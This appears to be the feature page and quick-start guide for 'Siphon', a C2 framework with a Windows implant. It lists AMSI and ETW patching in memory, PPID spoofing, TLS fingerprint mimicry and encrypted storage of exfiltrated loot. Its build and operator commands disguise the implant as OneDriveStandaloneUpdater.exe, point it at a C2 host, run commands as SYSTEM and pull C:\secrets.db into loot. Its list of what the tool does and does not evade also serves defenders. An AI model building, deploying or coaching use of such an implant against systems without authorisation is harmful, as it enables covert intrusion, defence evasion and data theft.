Security Features

Every session establishes forward secrecy. Every payload is authenticated. Every file is encrypted at rest.

Forward Secrecy

Ephemeral ECDH P-256 key exchange per session. Server public key embedded at build time. Shared secrets zeroed after derivation.

AES-256-GCM

Authenticated encryption for all payloads. Unique nonce per message. HMAC-SHA256 covers the full envelope: ID, PubKey, Nonce, Ciphertext.

uTLS Fingerprinting

Chrome JA3 fingerprint via HelloChrome_Auto. Cookie-based beacon transport blends with normal HTTPS traffic.

ETW/AMSI Patching

Patches ntdll!EtwEventWrite and amsi!AmsiScanBuffer in memory on startup. Userland evasion on Windows.

PPID Spoofing

Spawns child processes under explorer.exe with CREATE_NO_WINDOW. Blends with normal system process ancestry.

Encrypted Loot

Exfiltrated files encrypted at rest with AES-256-GCM. Path traversal protection via filepath.Base() sanitization.

Resource Limits

Max 1000 implants, 1000 results per implant, 512 KB chunks. Input limits: 64 KB cookie, 1 MB response, 10 MB submit body.

Binary Hardening

Stripped with -s -w -trimpath. No debug symbols, no file paths. Cross-compiled with CGO_ENABLED=0.

Concurrency Safety

sync.RWMutex and atomic operations throughout. Race-detector clean test suite. Deep-copied session keys.

Capabilities

Full-featured Windows implant with evasion. Linux implant for testing. Server runs on Linux.

Detection Awareness

Know what Siphon evades and what it doesn't. Honest tooling for professional operators.

Hidden From

  • Passive TLS inspection — uTLS Chrome fingerprint
  • ETW consumers — EtwEventWrite patched in memory
  • AMSI scanners — AmsiScanBuffer patched in memory
  • Process tree analysis — PPID spoofed under explorer.exe
  • Traffic analysis — cookie-based beacon on standard HTTPS endpoints

Visible To

  • Kernel-level ETW — syscall tracing below userland patches
  • EDR / XDR — behavioral analysis and memory scanning
  • Network proxies — TLS inspection with MITM certificates
  • Memory forensics — keys and buffers recoverable from RAM
  • Disk forensics — loot directory, registry keys, scheduled tasks

Architecture

Clean separation between server, implant, and shared protocol types. Platform-specific code isolated with build tags.

1

Shared Protocol

shared/types.go defines Beacon, Task, TaskResult, and Envelope types. JSON serialization with AES-256-GCM encryption and HMAC-SHA256 authentication.

2

Implant

ECDH key exchange, HTTPS transport with uTLS, task dispatcher. Platform-specific evasion (_windows.go) and persistence with build-tag isolation.

3

Server

HTTP handlers for beacon and submit endpoints. ECDH session management, encrypted loot storage, and interactive operator CLI with Catppuccin theming.

4

Build System

Makefile with ldflags injection for C2_HOST, SLEEP_SEC, SERVER_PK. Cross-compilation: Linux server, Windows implant. CGO_ENABLED=0.

Getting Started

Build from source. Generate keys. Deploy the implant with the server's public key embedded at compile time.

build.sh 
# Clone and setup
$ git clone https://github.com/Real-Fruit-Snacks/Siphon.git
$ cd Siphon

# Generate ECDH keypair + TLS certificate
$ make setup
[+] Server public key: 04a1b2c3...

# Build server
$ make server

# Build implant with embedded key
$ make implant SERVER_PK=04a1b2c3... C2_HOST=https://10.0.0.5:443
[+] Implant: build/OneDriveStandaloneUpdater.exe
operate.sh 
# Start the C2 server
$ ./build/siphon-server -listen :443 \
    -cert server/certs/server.crt \
    -key server/certs/server.key

# Interact with a checked-in implant
siphon> implants
  abc123  10.10.10.5  Windows 10  5s ago
siphon> interact abc
siphon(abc123)> cmd whoami
  nt authority\system
siphon(abc123)> upload C:\secrets.db
  [+] Saved to loot/abc123/secrets.db
